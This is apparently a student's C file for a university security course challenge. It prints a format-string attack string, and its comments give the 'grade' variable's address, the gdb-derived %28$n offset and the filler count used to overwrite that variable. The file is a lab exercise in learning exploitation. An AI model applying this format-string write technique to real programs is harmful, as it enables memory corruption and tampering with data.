// Jennifer Long
// rz5sc
// CS 4630
// OWL Challenge 5
// attack_spell5.c

#include <stdio.h>
#include <string.h>

///////////////////////////////////////////

// General Idea:
//    1) Mem addr of grade
//    2) after setting grade, return to main

// Values:
    // addr of grade: 0x0804a024, \x24\xa0\x04\x08
    // addr printed at char 65: "5564092"
    // distance of 5564092 from grade addr: 28 addrs -> %28$n

// Attack String Components
    // addr of grade (for overwriting)
    // Filler %x commands (59)
    // %n with jump (28)
    // My name

// gdb breakpoints: vulnerable3; after printf(*0x80484c7)

char attackString[] = "\x24\xa0\x04\x08 %59x %28$n\nJennifer Long ";


int main() {
 int i;
 char *p = attackString;
 for (i = 0; i < sizeof(attackString); i++) {
   putchar(*p);
   p++;
 }
 return 1;
}
